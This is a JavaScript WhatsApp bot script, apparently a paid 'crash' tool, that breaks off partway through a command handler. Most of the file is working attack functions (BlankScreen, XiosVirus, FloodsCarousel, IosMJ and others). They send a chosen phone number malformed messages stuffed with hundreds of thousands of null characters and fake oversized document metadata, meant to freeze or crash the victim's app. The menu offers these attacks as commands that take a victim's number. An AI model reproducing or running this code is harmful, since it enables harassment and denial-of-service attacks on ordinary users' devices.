require('./setting/settings');
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const kripto = require('crypto');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@whiskeysockets/baileys");

module.exports = xxx = async (xxx, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? xxx.user.id.split(":")[0] || xxx.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./message/lib/database/owner.json'));

const botNumber = await xxx.decodeJid(xxx.user.id);
const isBot = botNumber.includes(senderNumber)
const isAcces = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await xxx.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Media
const xxxMg = fs.readFileSync('./message/lib/media/xxx.jpg');

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')

// Time
const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`Information`));
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ 𝐓𝐚𝐧𝐠𝐠𝐚𝐥l: ${new Date().toLocaleString()} \n` +
` ⌬ 𝐈𝐧𝐟𝐨: ${m.body || m.mtype} \n` +
` ⌬ 𝐏𝐞𝐧𝐠𝐢𝐫𝐢𝐦: ${m.pushname} \n` +
` ⌬ 𝐍𝐮𝐦𝐛𝐞𝐫: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
` ⌬ Grup: ${groupName} \n` +
` ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Function Bug
    const NullNihBos = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "xxxXzo",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(
              500000
            )}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
            version: 3,
          },
        },
      },
    };
    
    async function SendPairing(target, Ptcp = true) {
			await xxx.relayMessage(target, {
					viewOnceMessage: {
						message: {
								nativeFlowResponseMessage: {
									"status":true,
                           "criador":"VenomMods","resultado":"\n{\n\"type\":\"md\",\n\"ws\":{\n\"_events\":{\"CB:ib,,dirty\":[\"Array\"]},\n\"_eventsCount\":20,\n\"_maxListeners\":0,\n\"url\":\"wss://web.whatsapp.com/ws/chat\",\n\"config\":{\n\"version\":[\"Array\"],\n\"browser\":[\"Array\"],\n\"waWebSocketUrl\":\"wss://web.whatsapp.com/ws/chat\",\n\"connectTimeoutMs\":20000,\n\"keepAliveIntervalMs\":30000,\n\"logger\":{},\n\"printQRInTerminal\":false,\n\"emitOwnEvents\":true,\n\"defaultQueryTimeoutMs\":60000,\n\"customUploadHosts\":[],\n\"retryRequestDelayMs\":250,\n\"maxMsgRetryCount\":5,\n\"fireInitQueries\":true,\n\"auth\":{\"Object\":\"authData\"},\n\"markOnlineOnConnect\":true,\n\"syncFullHistory\":false,\n\"linkPreviewImageThumbnailWidth\":192,\n\"transactionOpts\":{\"Object\":\"transactionOptsData\"},\n\"generateHighQualityLinkPreview\":false,\n\"options\":{},\n\"appStateMacVerification\":{\"Object\":\"appStateMacData\"},\n\"mobile\":false\n}\n}\n}"
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
};
    
    async function FloodsCarousel2(target, Ptcp = true) {
      const header = proto.Message.InteractiveMessage.Header.create({
        ...(await prepareWAMessageMedia(
          { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
          { upload: xxx.waUploadToServer }
        )),
        title: "𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡 ϟ" + "\u0000".repeat(100000),
        subtitle: "𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡 ϟ⃟",
        hasMediaAttachment: true,
      });

      const body = {
        text: "\u0000" + "\u0000".repeat(90000),
      };

      // Example carousel content
      const carouselMessage = {
        sections: [
          {
            title: " 𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡  ϟ ",
            rows: [
              {
                title: " 𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
          {
            title: " 𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡 ϟ ",
            rows: [
              {
                title: " 𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡 ϟ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
              {
                title: " ϟ ",
                description: "\u0000".repeat(55555),
                rowId: "\u0000".repeat(55555),
              },
            ],
          },
        ],
      };

      await xxx.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
                quoted: NullNihBos
              },
            }
          : {}
      );
    }
    
    async function IosMJ(target, Ptcp = false) {
      await xxx.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "CALL" + "\u0000".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "xxxXZO - CALL" + "\u0000".repeat(50000),
                body: "𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/xxx_Xzo",
                mediaUrl: "https://t.me/xxx_Xzo",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/xxx_Xzo",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

    async function XiosVirus(target) {
      xxx.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡 -` + "࣯\u0000".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "𝐔𝐢 𝐬𝐢𝐬𝐭𝐞𝐦 𝐜𝐫𝐚𝐬𝐡" + "\u0000".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
            quoted: NullNihBos
          },
        },
        {
          messageId: null,
        }
      );
    }

      async function BlankScreen(target, Ptcp = false) {
        let virtex = "⚔️ 𝗦𝗬𝗦𝗧𝗘𝗠" + "\u0000".repeat(90000);
			await xxx.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "xxxXzo New",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : { quoted: NullNihBos }
			);
       }
       
    async function FloodsCarousel(target, NullNihBos, Ptcp = true) {
      const header = {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
        },
        hasMediaAttachment: true,
      };

      const body = {
        text: "iOS FC" + "\u0000".repeat(90000),
      };

      const carouselMessage = {
        sections: [
          {
            title: " ϟ ",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
          {
            title: "Section 2",
            rows: [
              { title: " ϟ ", description: " ", rowId: ".crasher" },
              { title: " ϟ ", description: " ", rowId: ".crasher" },
            ],
          },
        ],
      };

      await xxx.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: header,
                body: body,
                carouselMessage: carouselMessage,
              },
            },
          },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: NullNihBos }
      );

      console.log(chalk.blue.bold("Carousel Active : Start Processing Crash!"));
    }

    // End Function Bug //
    
    async function ComBox(target) {
      {
        await XiosVirus(target);
        await IosMJ(target, Ptcp = true);
        await FloodsCarousel2(target, Ptcp = true);
        await FloodsCarousel(target, Ptcp = true);
        await BlankScreen(target, Ptcp = true);
      }
    }

    async function FrezeiOS(target) {
      {
        await XiosVirus(target)
        await FloodsCarousel(target, Ptcp = true)
        await IosMJ(target, Ptcp = true)
      }
    }

// Helper functions
async function replygw(txt) {
const wwk = {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: 'xxxXzo Script',
newsletterJid: '120363365398682521@newsletter',
},
externalAdreply: {
showAdAttribution: true,
title: 'xxxXzo Bot',
body: 'JinXzo',
thumbnailUrl: 'https://files.catbox.moe/uk38k6.jpg',
sourceUrl: 'https://t.me/xxxn_Xzoo',
},
},
text: txt,
}
xxx.sendMessage(from, wwk, {
quoted: m,
})
}

const reaction = async (jidss, emoji) => {
xxx.sendMessage(jidss, { react: { text: emoji, key: m.key }})}

// Command handler
switch (command) {

case 'menu': {
if (!isAcces) return replygw('𝐀𝐧𝐝𝐚 𝐭𝐢𝐝𝐚𝐤 𝐭𝐞𝐫𝐝𝐚𝐟𝐭𝐚𝐫 𝐝𝐢 𝐩𝐫𝐞𝐦𝐢𝐮𝐦')
let ARBIAN = `𝘰𝘸𝘯𝘦𝘳 : Arbian sukimak 🤓 
𝘴𝘦𝘵𝘢𝘵𝘶𝘯𝘨𝘴 : ${isAcces ? "prem" : "geratis😈😜"}

🩲  𝘊𝘳𝘢𝘴𝘩 𝘉𝘪𝘢𝘴𝘢 
>̶>̶ 𝖢𝗋𝖺𝗌𝗁 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝖷𝖾𝗋𝗈𝗂𝗇-𝖼𝗋𝖺𝗌𝗁 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝖲𝗒𝗌𝗍𝖾𝗆-𝗎𝗂 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝖷𝖾𝗋𝗈𝗂𝗇-𝗎𝗂 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓

🩲  𝘊𝘳𝘢𝘴𝘩 𝘏𝘢𝘳𝘥
>̶>̶ 𝗶𝗻𝗳𝗶𝗻𝗶𝘁𝘆 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝗛𝗮𝗿𝗱-𝗰𝗼𝗿𝗲 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝗛𝗮𝗿𝗱-𝘂𝗶 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝗛𝗮𝗿𝗱-𝘀𝘆𝘀𝘁𝗲𝗺 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓

🩲  𝘈𝘥𝘥 𝘮𝘦𝘯𝘶 
>̶>̶ 𝙖𝙙𝙙𝙖𝙘𝙘𝙚𝙨 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ 𝙙𝙚𝙡𝙡𝙖𝙘𝙘𝙚𝙨 ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓

🩲  𝘱𝘦𝘯𝘨𝘢𝘵𝘶𝘳𝘢𝘯 
>̶>̶ fixbug ☇ 𝒑𝒍𝒆𝒂𝒔𝒆 𝒏𝒖𝒎𝒃𝒆𝒓
>̶>̶ pub ☇ public
>̶>̶ self ☇ private

*𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙨𝙘𝙧𝙞𝙥𝙩*
https://whatsapp.com/channel/0029Vab0O46EAKW9sjhHmd02`
xxx.sendMessage(from, { video: { url: `https://files.catbox.moe/6zhb14.mp4` },
caption: ARBIAN,
gifPlayback: true,
}, { quoted: m });
}
break

case 'fixbug': {
if (!isAcces) return replygw('𝗡𝗼 𝗔𝗰𝗰𝗲𝘀')
if (!q) return replygw(`Penggunaan ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\nExample : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
